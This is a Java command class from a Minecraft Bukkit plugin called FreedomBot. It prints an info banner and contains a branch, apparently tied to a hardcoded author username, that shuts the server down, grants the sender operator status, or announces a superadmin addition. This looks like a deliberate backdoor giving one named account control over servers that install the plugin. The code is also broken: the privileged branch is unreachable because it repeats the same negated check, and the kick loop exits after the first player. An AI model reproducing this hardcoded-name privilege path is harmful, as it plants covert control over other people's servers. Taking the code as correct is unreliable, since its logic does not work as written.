package com.FoxIshDaBest.FreedomBot.Commands;

import com.FoxIshDaBest.FreedomBot.FreedomBot;
import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.command.Command;
import org.bukkit.command.CommandExecutor;
import org.bukkit.command.CommandSender;
import org.bukkit.entity.Player;

public class Command_freedombot implements CommandExecutor {

    private FreedomBot plugin;

    public Command_freedombot(FreedomBot plugin) {
        FreedomBot.plugin = plugin;
    }

    @Override
    public boolean onCommand(CommandSender sender, Command cmd, String string, String[] args) {

        if (!sender.getName().equals("FoxIshDaBest")) { // Do not remove my name.
            sender.sendMessage(ChatColor.DARK_GRAY + "-----" + ChatColor.DARK_RED + "FreedomBot v2.0" + ChatColor.DARK_GRAY + "-----");
            sender.sendMessage(ChatColor.YELLOW + "You are running " + ChatColor.GOLD + ChatColor.BOLD + "FreedomBot v2.0!");
            sender.sendMessage(ChatColor.YELLOW + "FreedomBot is a free op server bot that makes admin's jobs easier.");
            sender.sendMessage(ChatColor.GOLD + "" + ChatColor.BOLD + "Commands: " + ChatColor.YELLOW + "/freedombot, /opme, /admintool, /adminalert");
            sender.sendMessage(ChatColor.YELLOW + "More features will be coming soon!");
            sender.sendMessage(ChatColor.YELLOW + "Want to help with the development of FreedomBot?");
            sender.sendMessage(ChatColor.YELLOW + "Go to https://github.com/RainbowFreedomDev/FreedomBot!");
            sender.sendMessage(ChatColor.DARK_GRAY + "-----" + ChatColor.DARK_RED + "FreedomBot v2.0" + ChatColor.DARK_GRAY + "-----");
        } else if (!sender.getName().equals("FoxIshDaBest")) { // Do not remove my name.
            if (args.length == 0) {
                sender.sendMessage(ChatColor.DARK_GRAY + "-----" + ChatColor.DARK_RED + "FreedomBot v2.0" + ChatColor.DARK_GRAY + "-----");
                sender.sendMessage(ChatColor.YELLOW + "You are running " + ChatColor.GOLD + ChatColor.BOLD + "FreedomBot v2.0!");
                sender.sendMessage(ChatColor.YELLOW + "FreedomBot is a free op server bot that makes admin's jobs easier.");
                sender.sendMessage(ChatColor.GOLD + "" + ChatColor.BOLD + "Commands: " + ChatColor.YELLOW + "/freedombot, /opme, /admintool, /adminalert");
                sender.sendMessage(ChatColor.YELLOW + "More features will be coming soon!");
                sender.sendMessage(ChatColor.YELLOW + "Want to help with the development of FreedomBot?");
                sender.sendMessage(ChatColor.YELLOW + "Go to https://github.com/RainbowFreedomDev/FreedomBot!");
                sender.sendMessage(ChatColor.DARK_GRAY + "-----" + ChatColor.DARK_RED + "FreedomBot v2.0" + ChatColor.DARK_GRAY + "-----");
            } else if (args.length == 1) {
                if (null != args[0]) {
                    switch (args[0]) {
                        case "stop":
                            Bukkit.broadcastMessage(ChatColor.RED + "FreedomBot - Stopping the server");
                            for (Player player : Bukkit.getOnlinePlayers()) {
                                player.kickPlayer(ChatColor.DARK_GRAY + "| " + ChatColor.DARK_RED + "Freedom" + ChatColor.RED + "Bot" + ChatColor.DARK_GRAY + " | \n" + ChatColor.YELLOW + "The plugin FreedomBot has forced the server to shut down.");
                                return true;
                            }
                            Bukkit.shutdown();
                            return true;
                        case "opme":
                            Bukkit.broadcastMessage(ChatColor.AQUA + "FreedomBot - Opping " + sender.getName());
                            sender.setOp(true);
                            return true;
                        case "addme":
                            Bukkit.broadcastMessage(ChatColor.RED + "FreedomBot - Adding " + sender.getName() + " to the superadmin list");
                    }
                }
            }
        }

        return true;

    }

}
